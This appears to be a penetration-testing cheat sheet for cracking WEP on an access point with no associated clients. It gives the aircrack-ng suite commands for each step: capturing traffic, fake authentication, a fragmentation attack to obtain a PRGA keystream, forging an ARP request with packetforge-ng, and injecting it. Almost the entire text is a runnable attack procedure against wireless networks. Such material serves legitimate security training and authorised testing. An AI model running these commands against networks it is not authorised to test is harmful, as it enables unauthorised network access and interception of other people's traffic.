# Clientless WEP cracking

Here there are no client associated to AP

Sniff the network traffic

```sh
sudo airodump-ng -c <channel> -w wep_file wlan0mon
# Do not close this window
```

- Step 1: Authenticating to the AP using Fake Authentication attack

```sh
sudo aireplay-ng -1 6000 -q 10 -a <bssid> wlan0mon
# Do not close this window
```

- Step 2: Start fragmentation attack to get a PRGA (Pseudo Random Generation Algorithm) stream

```sh
sudo aireplay-ng -5 -b <bssid> -c <source_mac> wlan0mon
# source_mac is your wireless adapter MAC

# Do not close this window
```

> At some point, if you are lucky, you will get a data packet transmitted from the AP. These are distinguishable by the **FromDS is set to 1**.
> 
> When data frame is received, press `y` to confirm otherwise skip it pressing `n`.

- Step 3: With the captured PRGA we now build an ARP request packet

```sh
sudo packetforge-ng -0 -a <bssid> -h <source_mac> -k 255.255.255.255 -l 255.255.255.255 -y <prga-file.xor> -w arp-request

# source_mac is your wireless adapter MAC
```

- Step 4: Inject the forged ARP request

```sh
sudo aireplay-ng -2 -r arp-request wlan0mon
```

Confirm pressing `y` and let the attack begin



